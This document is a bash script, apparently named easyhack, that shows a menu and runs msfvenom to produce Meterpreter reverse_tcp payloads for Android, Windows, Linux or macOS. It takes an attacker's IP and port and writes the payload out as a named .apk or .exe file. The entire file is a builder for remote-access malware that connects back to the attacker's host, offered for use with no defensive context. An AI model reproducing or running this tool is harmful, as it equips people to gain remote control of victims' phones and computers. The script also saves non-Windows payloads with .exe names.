clear
echo " _______  _______  _______  __   __  __   __  _______  _______  ___   _ "
echo "|       ||   _   ||       ||  | |  ||  | |  ||   _   ||       ||   | | |"
echo "|    ___||  |_|  ||  _____||  |_|  ||  |_|  ||  |_|  ||       ||   |_| |"
echo "|   |___ |       || |_____ |       ||       ||       ||       ||      _|"
echo "|    ___||       ||_____  ||_     _||       ||       ||      _||     |_ "
echo "|   |___ |   _   | _____| |  |   |  |   _   ||   _   ||     |_ |    _  |"
echo "|_______||__| |__||_______|  |___|  |__| |__||__| |__||_______||___| |_|"
echo "[======================================================================]"
	   echo -e '\t\t'  "+---------------------------------+"
	   echo -e '\t\t'  "+          1). Android            +"
	   echo -e '\t\t'  "+          2). Windows            +"
	   echo -e '\t\t'  "+          3). Linux              +"
	   echo -e '\t\t'  "+          4). MacOS              +"
	   echo -e '\t\t'  "+          5). Exit               +"
	   echo -e '\t\t'  "+---------------------------------+"
	   read -p "Choose Platform: " num
	case $num in
	1)
		read -p "Enter LHOST (IP Add.):" ip
    	read -p "Enter LPORT (Open Port): " port
    	read -p "Enter APK Name: " apk
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$apk.apk
		;;
	2)
    	read -p "Enter LPORT (Open Port): " port
    	read -p "Enter LHOST (IP Add.):" ip
    	read -p "Enter EXE Name: " exe
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$exe.exe
    	;;
	3)
		read -p "Enter LHOST (IP Add.):" ip
    	read -p "Enter LPORT (Open Port): " port
    	read -p "Enter File Name: " fname
		msfvenom -p linux/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$fname.exe
    	;;
	4)
		read -p "Enter LHOST (IP Add.):" ip
    	read -p "Enter LPORT (Open Port): " port
    	read -p "Enter File Name: " fname
		msfvenom -p osx/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$fname.exe
    	;;
	5)
		read -p "Do You Want To Exit?(Y|N) " ans
		case $ans in
			y|Y)
				echo "Good Bye"
				exit
				;;
			n|N)
				./easyhack.sh
			;;
		esac
		;;
	*)
		echo "invalide Choice"
		;;
	esac

